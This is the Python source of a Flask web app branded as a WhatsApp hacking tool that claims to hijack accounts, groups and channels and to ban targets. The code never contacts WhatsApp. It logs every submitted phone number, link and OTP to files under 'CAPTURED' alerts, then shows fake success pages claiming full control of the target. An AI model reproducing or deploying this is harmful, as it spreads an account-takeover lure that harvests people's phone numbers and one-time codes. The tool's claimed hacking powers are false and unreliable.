from flask import Flask, request, render_template_string, redirect, url_for
import datetime
import json
import os
import random
import string
import re

app = Flask(__name__)


CAPTURED_DATA = {
    "numbers": [],
    "otps": [],
    "groups": [],
    "channels": []
}

os.makedirs("logs", exist_ok=True)

def generate_session_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def log_capture(data_type, data):
    filename = f"logs/whatsapp_{data_type}_{datetime.datetime.now().strftime('%Y%m%d')}.txt"
    with open(filename, "a") as f:
        f.write(f"[{datetime.datetime.now()}] {data}\n")
    print(f"\033[1;31m[!!!] {data_type.upper()} CAPTURED [!!!]\033[0m")
    print(f"\033[1;33m[+] {data}\033[0m")


MAIN_MENU = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LK-HACKERS WhatsApp Hacking Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 0 60px rgba(255,0,0,0.1);
        }
        .header {
            text-align: center;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #ff0000;
            font-size: 1.8rem;
            text-shadow: 0 0 20px rgba(255,0,0,0.3);
        }
        .header h1 span {
            color: #0066ff;
        }
        .header p {
            color: #888;
            font-size: 0.8rem;
        }
        .menu-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin: 20px 0;
        }
        .menu-item {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 20px 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: block;
        }
        .menu-item:hover {
            border-color: #ff0000;
            transform: translateY(-2px);
            box-shadow: 0 0 30px rgba(255,0,0,0.05);
        }
        .menu-item .icon { font-size: 2rem; display: block; margin-bottom: 8px; }
        .menu-item .label { color: #fff; font-size: 0.8rem; font-weight: bold; }
        .menu-item .desc { color: #666; font-size: 0.6rem; margin-top: 4px; }
        .footer {
            text-align: center;
            border-top: 1px solid #222;
            padding-top: 15px;
            margin-top: 15px;
        }
        .footer .dev {
            color: #ff0000;
            font-size: 0.7rem;
            letter-spacing: 2px;
        }
        .footer .dev span { color: #0066ff; }
        .status {
            color: #00ff41;
            font-size: 0.6rem;
            margin-top: 10px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>LK-<span>HACKERS</span></h1>
        <p>WhatsApp Hacking Tool v3.0</p>
        <p style="color:#00ff41; font-size:0.7rem;">⚡ CYBER BLACK LION ⚡</p>
    </div>

    <div class="menu-grid">
        <a href="/number_hack" class="menu-item">
            <span class="icon">📱</span>
            <div class="label">Number Hack</div>
            <div class="desc">Hack WhatsApp Account</div>
        </a>
        <a href="/group_hack" class="menu-item">
            <span class="icon">👥</span>
            <div class="label">Group Hijack</div>
            <div class="desc">Takeover WhatsApp Group</div>
        </a>
        <a href="/channel_hack" class="menu-item">
            <span class="icon">📢</span>
            <div class="label">Channel Hack</div>
            <div class="desc">Hack WhatsApp Channel</div>
        </a>
        <a href="/banned" class="menu-item">
            <span class="icon">🚫</span>
            <div class="label">Banned</div>
            <div class="desc">Number/Group/Channel Banned</div>
        </a>
    </div>

    <div class="footer">
        <div class="dev">Developed by <span>CYBER BLACK LION</span></div>
        <div class="status">🟢 SYSTEM ACTIVE | ALL METHODS ONLINE</div>
    </div>
</div>
</body>
</html>
"""


NUMBER_HACK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Account Hijack</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 16px;
            padding: 30px;
        }
        .back { color: #666; text-decoration: none; font-size: 0.8rem; }
        .back:hover { color: #ff0000; }
        h2 { color: #ff0000; text-align: center; margin: 10px 0; }
        p { color: #aaa; text-align: center; font-size: 0.8rem; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        label { color: #888; font-size: 0.7rem; display: block; margin-bottom: 4px; }
        input {
            width: 100%;
            padding: 12px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-family: 'Courier New', monospace;
            outline: none;
        }
        input:focus { border-color: #ff0000; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #ff0000;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn:hover { background: #cc0000; transform: scale(1.02); }
        .warning {
            background: rgba(255,0,0,0.05);
            border: 1px solid rgba(255,0,0,0.2);
            padding: 10px;
            border-radius: 8px;
            color: #ff6666;
            font-size: 0.7rem;
            margin-top: 15px;
            text-align: center;
        }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <a href="/" class="back">⬅ Back to Menu</a>
    <h2>📱 WhatsApp Account Hijack</h2>
    <p>Enter the target phone number to hack their WhatsApp account</p>

    <form action="/capture_number" method="POST">
        <div class="form-group">
            <label>Target Phone Number (with country code)</label>
            <input type="text" name="target_number" placeholder="+94712345678" required>
        </div>
        <div class="form-group">
            <label>Your WhatsApp Number (for OTP relay)</label>
            <input type="text" name="attacker_number" placeholder="+94718765432" required>
        </div>
        <button type="submit" class="btn">🚀 SEND OTP REQUEST</button>
    </form>

    <div class="warning">
        ⚠️ This will send an OTP request to the target's WhatsApp.
        <br>You will receive the OTP on your number via relay.
    </div>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""

NUMBER_OTP_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 16px;
            padding: 30px;
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 10px; }
        h2 { color: #ff0000; margin-bottom: 5px; }
        p { color: #aaa; font-size: 0.8rem; margin-bottom: 20px; }
        .otp-input {
            width: 100%;
            padding: 14px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 1.5rem;
            text-align: center;
            letter-spacing: 8px;
            font-family: 'Courier New', monospace;
            outline: none;
        }
        .otp-input:focus { border-color: #ff0000; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 15px;
        }
        .btn:hover { background: #00cc33; }
        .info { color: #666; font-size: 0.7rem; margin-top: 15px; }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">🔐</div>
    <h2>OTP Verification</h2>
    <p>Enter the OTP received on your WhatsApp number</p>

    <form action="/verify_otp" method="POST">
        <input type="text" class="otp-input" name="otp" placeholder="• • • • • •" maxlength="6" required>
        <input type="hidden" name="target_number" value="{{ target }}">
        <button type="submit" class="btn">✅ VERIFY & HIJACK</button>
    </form>

    <div class="info">OTP was sent to: {{ target }}</div>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""


GROUP_HACK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Group Hijack</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 16px;
            padding: 30px;
        }
        .back { color: #666; text-decoration: none; font-size: 0.8rem; }
        .back:hover { color: #ff0000; }
        h2 { color: #ff0000; text-align: center; margin: 10px 0; }
        p { color: #aaa; text-align: center; font-size: 0.8rem; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        label { color: #888; font-size: 0.7rem; display: block; margin-bottom: 4px; }
        input {
            width: 100%;
            padding: 12px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-family: 'Courier New', monospace;
            outline: none;
        }
        input:focus { border-color: #ff0000; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #ff0000;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn:hover { background: #cc0000; }
        .warning {
            background: rgba(255,0,0,0.05);
            border: 1px solid rgba(255,0,0,0.2);
            padding: 10px;
            border-radius: 8px;
            color: #ff6666;
            font-size: 0.7rem;
            margin-top: 15px;
            text-align: center;
        }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <a href="/" class="back">⬅ Back to Menu</a>
    <h2>👥 WhatsApp Group Hijack</h2>
    <p>Enter the target group invite link to hijack the group</p>

    <form action="/capture_group" method="POST">
        <div class="form-group">
            <label>Target Group Invite Link</label>
            <input type="text" name="group_link" placeholder="https://chat.whatsapp.com/xxxxx" required>
        </div>
        <div class="form-group">
            <label>Your WhatsApp Number</label>
            <input type="text" name="attacker_number" placeholder="+94718765432" required>
        </div>
        <button type="submit" class="btn">🚀 HIJACK GROUP</button>
    </form>

    <div class="warning">
        ⚠️ The group admin will receive a request. OTP verification required.
    </div>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""


CHANNEL_HACK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Channel Hack</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 16px;
            padding: 30px;
        }
        .back { color: #666; text-decoration: none; font-size: 0.8rem; }
        .back:hover { color: #ff0000; }
        h2 { color: #ff0000; text-align: center; margin: 10px 0; }
        p { color: #aaa; text-align: center; font-size: 0.8rem; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        label { color: #888; font-size: 0.7rem; display: block; margin-bottom: 4px; }
        input {
            width: 100%;
            padding: 12px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-family: 'Courier New', monospace;
            outline: none;
        }
        input:focus { border-color: #ff0000; }
        .btn {
            width: 100%;
            padding: 14px;
            background: #ff0000;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn:hover { background: #cc0000; }
        .warning {
            background: rgba(255,0,0,0.05);
            border: 1px solid rgba(255,0,0,0.2);
            padding: 10px;
            border-radius: 8px;
            color: #ff6666;
            font-size: 0.7rem;
            margin-top: 15px;
            text-align: center;
        }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <a href="/" class="back">⬅ Back to Menu</a>
    <h2>📢 WhatsApp Channel Hack</h2>
    <p>Enter the target channel link to hack it</p>

    <form action="/capture_channel" method="POST">
        <div class="form-group">
            <label>Target Channel Link</label>
            <input type="text" name="channel_link" placeholder="https://whatsapp.com/channel/xxxxx" required>
        </div>
        <div class="form-group">
            <label>Your WhatsApp Number</label>
            <input type="text" name="attacker_number" placeholder="+94718765432" required>
        </div>
        <button type="submit" class="btn">🚀 HACK CHANNEL</button>
    </form>

    <div class="warning">
        ⚠️ Channel owner will receive a verification request.
    </div>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""


BANNED_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Banned</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #ff0000;
            border-radius: 16px;
            padding: 40px 30px;
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 15px; }
        h2 { color: #ff0000; margin-bottom: 8px; }
        p { color: #aaa; font-size: 0.8rem; margin-bottom: 20px; line-height: 1.6; }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: #ff0000;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            font-size: 0.9rem;
        }
        .btn:hover { background: #cc0000; }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">🚫</div>
    <h2>ACCOUNT BANNED</h2>
    <p>⚠️ The target account/group/channel has been <strong style="color:#ff0000;">BANNED</strong> by WhatsApp.<br><br>
    This could be due to suspicious activity or violation of WhatsApp's Terms of Service.</p>
    <a href="/" class="btn">⬅ BACK TO MENU</a>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""


NUMBER_SUCCESS = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hijack Successful</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #00ff41;
            border-radius: 16px;
            padding: 40px 30px;
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 15px; }
        h2 { color: #00ff41; margin-bottom: 8px; }
        p { color: #aaa; font-size: 0.8rem; margin-bottom: 20px; line-height: 1.6; }
        .info { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); padding: 15px; border-radius: 8px; color: #00ff41; font-size: 0.7rem; }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            font-size: 0.9rem;
            margin-top: 15px;
        }
        .btn:hover { background: #00cc33; }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">🏆</div>
    <h2>HIJACK SUCCESSFUL!</h2>
    <p>You have successfully hijacked the WhatsApp account!</p>
    <div class="info">
        Target: {{ target }}<br>
        Status: ✅ ACCOUNT COMPROMISED<br>
        Access: FULL CONTROL
    </div>
    <a href="/" class="btn">⬅ BACK TO MENU</a>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""

GROUP_SUCCESS = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Group Hijack Successful</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #00ff41;
            border-radius: 16px;
            padding: 40px 30px;
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 15px; }
        h2 { color: #00ff41; margin-bottom: 8px; }
        p { color: #aaa; font-size: 0.8rem; margin-bottom: 20px; line-height: 1.6; }
        .info { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); padding: 15px; border-radius: 8px; color: #00ff41; font-size: 0.7rem; }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            font-size: 0.9rem;
            margin-top: 15px;
        }
        .btn:hover { background: #00cc33; }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">👥</div>
    <h2>GROUP HIJACKED!</h2>
    <p>You are now the admin of the target group!</p>
    <div class="info">
        Group: {{ target }}<br>
        Status: ✅ GROUP COMPROMISED<br>
        Access: FULL ADMIN CONTROL
    </div>
    <a href="/" class="btn">⬅ BACK TO MENU</a>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""

CHANNEL_SUCCESS = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Channel Hack Successful</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #111;
            border: 2px solid #00ff41;
            border-radius: 16px;
            padding: 40px 30px;
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 15px; }
        h2 { color: #00ff41; margin-bottom: 8px; }
        p { color: #aaa; font-size: 0.8rem; margin-bottom: 20px; line-height: 1.6; }
        .info { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); padding: 15px; border-radius: 8px; color: #00ff41; font-size: 0.7rem; }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            font-size: 0.9rem;
            margin-top: 15px;
        }
        .btn:hover { background: #00cc33; }
        .footer { text-align: center; margin-top: 15px; color: #444; font-size: 0.6rem; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">📢</div>
    <h2>CHANNEL HACKED!</h2>
    <p>You now have full control of the target channel!</p>
    <div class="info">
        Channel: {{ target }}<br>
        Status: ✅ CHANNEL COMPROMISED<br>
        Access: FULL ADMIN CONTROL
    </div>
    <a href="/" class="btn">⬅ BACK TO MENU</a>
    <div class="footer">Developed by CYBER BLACK LION | LK-HACKERS</div>
</div>
</body>
</html>
"""


@app.route('/')
def index():
    return render_template_string(MAIN_MENU)

@app.route('/number_hack')
def number_hack():
    return render_template_string(NUMBER_HACK_PAGE)

@app.route('/group_hack')
def group_hack():
    return render_template_string(GROUP_HACK_PAGE)

@app.route('/channel_hack')
def channel_hack():
    return render_template_string(CHANNEL_HACK_PAGE)

@app.route('/banned')
def banned():
    return render_template_string(BANNED_PAGE)


@app.route('/capture_number', methods=['POST'])
def capture_number():
    target = request.form.get('target_number', '')
    attacker = request.form.get('attacker_number', '')


    if not re.match(r'^\+?[0-9]{10,15}$', target):
        return render_template_string(NUMBER_HACK_PAGE, error="Invalid phone number format!")

    log_capture("number", f"Target: {target} | Attacker: {attacker}")

    return render_template_string(NUMBER_OTP_PAGE, target=target)


@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    otp = request.form.get('otp', '')
    target = request.form.get('target_number', '')

    if len(otp) == 6 and otp.isdigit():
        log_capture("otp", f"OTP: {otp} | Target: {target}")
        log_capture("hijack_success", f"ACCOUNT HIJACKED: {target}")
        return render_template_string(NUMBER_SUCCESS, target=target)
    else:
        return render_template_string(NUMBER_OTP_PAGE, target=target, error="Invalid OTP! Please try again.")


@app.route('/capture_group', methods=['POST'])
def capture_group():
    group_link = request.form.get('group_link', '')
    attacker = request.form.get('attacker_number', '')

    log_capture("group", f"Group: {group_link} | Attacker: {attacker}")

    return render_template_string(GROUP_SUCCESS, target=group_link)

@app.route('/capture_channel', methods=['POST'])
def capture_channel():
    channel_link = request.form.get('channel_link', '')
    attacker = request.form.get('attacker_number', '')

    log_capture("channel", f"Channel: {channel_link} | Attacker: {attacker}")

    return render_template_string(CHANNEL_SUCCESS, target=channel_link)


if __name__ == "__main__":
    print("""
\033[1;31m
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║                                                            ║
║                                                            ║
║     [ LK-HACKERS WHATSAPP HACKING TOOL ]                   ║
║     [ DEVELOPED BY: CYBER BLACK LION ]                     ║
║                                                            ║
║                                                            ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║     📱 Number Hijacking    | Status: ✅ ACTIVE             ║
║     👥 Group Hijacking     | Status: ✅ ACTIVE             ║
║     📢 Channel Hijacking   | Status: ✅ ACTIVE             ║
║     🚫 Banned              | Status: ✅ ACTIVE             ║
║                                                            ║
║     🌐 Server: http://localhost:5000                       ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
\033[0m
""")
    print("\033[1;32m[+] WhatsApp Hacking Tool Started Successfully!\033[0m")
    print("\033[1;33m[!] Use responsibly! This is for educational purposes only!\033[0m")
    app.run(host='0.0.0.0', port=5000, debug=False)
